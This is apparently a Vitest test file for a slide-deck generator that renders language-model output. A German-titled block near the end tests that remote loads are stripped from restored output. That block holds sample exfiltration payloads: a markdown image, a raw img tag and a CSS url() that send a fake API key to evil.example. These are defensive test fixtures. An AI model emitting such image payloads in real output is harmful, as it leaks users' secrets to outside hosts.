import { describe, it, expect, vi } from "vitest";
import { runGenerateDeck } from "../src/generate-deck";
import { renderMarkdown } from "../src/vendor/deck-core/pure/render/md2html";

const baseMessages = [{ role: "user" as const, content: "src" }];
function deps(client: any, over: any = {}) {
  return { client, messages: baseMessages, themeKey: "dark", signal: new AbortController().signal, onState: () => {}, ...over };
}

describe("runGenerateDeck", () => {
  it("happy path: returns a themed deck, not incomplete, no fallback", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A\n\n---\n\n# B", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("ok");
    expect(r.markdown).toContain("theme: dark");
    expect(r.incomplete).toBe(false);
    expect(r.usedFallback).toBe(false);
  });

  it("writes a source backlink into the frontmatter when sourceLink is given", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client, { sourceLink: "[[Original]]" }));
    expect(r.markdown).toContain('source: "[[Original]]"');
    expect(r.markdown).toContain("theme: dark");
  });

  it("marks incomplete on finish_reason length", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", finishReason: "length", usedFallback: false })) };
    expect((await runGenerateDeck(deps(client))).incomplete).toBe(true);
  });

  it("propagates usedFallback from the client (C7)", async () => {
    const client = { generate: vi.fn(async () => ({ content: "# A", reasoning: "", usedFallback: true })) };
    expect((await runGenerateDeck(deps(client))).usedFallback).toBe(true);
  });

  it("retries once on a format-fatal result, then succeeds (with retry feedback)", async () => {
    const client = { generate: vi.fn() };
    client.generate.mockResolvedValueOnce({ content: "", reasoning: "", usedFallback: false });
    client.generate.mockResolvedValueOnce({ content: "# Good", reasoning: "", usedFallback: false });
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("ok");
    expect(client.generate).toHaveBeenCalledTimes(2);
    expect(client.generate.mock.calls[1][0].length).toBeGreaterThan(baseMessages.length);
  });

  it("gives up after 2 fatal runs with kind:format (hard cap)", async () => {
    const client = { generate: vi.fn(async () => ({ content: "", reasoning: "", usedFallback: false })) };
    const r = await runGenerateDeck(deps(client));
    expect(r.status).toBe("fatal");
    expect(r.kind).toBe("format");
    expect(client.generate).toHaveBeenCalledTimes(2);
  });

  it("returns fatal kind:server immediately on an envelope error (NO retry)", async () => {
    const client = { generate: vi.fn(async () => { throw new Error("model not loaded"); }) };
    const r = await runGenerateDeck(deps(client));
    expect(r).toMatchObject({ status: "fatal", error: "model not loaded", kind: "server" });
    expect(client.generate).toHaveBeenCalledTimes(1);
  });

  it("returns aborted on AbortError", async () => {
    const client = { generate: vi.fn(async () => { const e = new Error("Aborted"); e.name = "AbortError"; throw e; }) };
    expect((await runGenerateDeck(deps(client))).status).toBe("aborted");
  });

  describe("restaurierte Antwort: Fernquellen werden entschaerft (Sicherheitsgrenze der Schwaerzung)", () => {
    const SECRET = "sk-abcdef0123456789abcdef";
    const run = async (content: string) => {
      const client = { generate: vi.fn(async () => ({ content, reasoning: "", usedFallback: false })) };
      const r = await runGenerateDeck(deps(client));
      expect(r.status).toBe("ok");
      return r.markdown ?? "";
    };

    /** Laedt das gerenderte HTML etwas von aussen? (img/src, url() — was die Vorschau beim Rendern holt) */
    const loadsRemote = (markdown: string): boolean => {
      const html = renderMarkdown({ markdown, resolveEmbed: () => null }).html;
      return /<(?:img|iframe|video|audio|source)\b[^>]*\bsrc=["']?https?:/i.test(html) || /url\(\s*["']?https?:/i.test(html);
    };

    it.each([
      ["Markdown-Bild", `# A\n\n![x](https://evil.example/?d=${SECRET})`],
      ["rohes <img>", `# A\n\n<img src="https://evil.example/h?d=${SECRET}">`],
      ["url() in style", `# A\n\n<div style="background:url(https://evil.example/b?d=${SECRET})">x</div>`],
    ])("%s laedt nach der Entschaerfung nichts mehr von aussen — und ohne sie schon (Gegenprobe)", async (_name, content) => {
      expect(loadsRemote(content)).toBe(true);
      expect(loadsRemote(await run(content))).toBe(false);
    });

    it("ein dataviewjs-Block laeuft nicht mehr als Prozessor-Fence", async () => {
      const md = await run("# A\n\n```dataviewjs\ndv.pages()\n```");
      expect(md).not.toMatch(/^```dataviewjs/m);
    });

    it("ein Deck mit Mermaid, Direktive, Code-Fence, Datei-Embed und data:-Bild bleibt unveraendert", async () => {
      const body = [
        "# A", "", "<!-- layout: two-column -->", "", "![[bild.png]]", "",
        "```mermaid", "graph TD; A-->B", "```", "", "```ts", "const x = 1;", "```", "",
        "![lokal](data:image/png;base64,AAAA)", "", "![rel](bilder/a.png)", "",
        "---", "", "# B", "", "[Link](https://example.org)",
      ].join("\n");
      const md = await run(body);
      for (const stueck of ["<!-- layout: two-column -->", "![[bild.png]]", "```mermaid", "```ts", "![lokal](data:image/png;base64,AAAA)", "![rel](bilder/a.png)", "[Link](https://example.org)"]) {
        expect(md).toContain(stueck);
      }
    });
  });
});
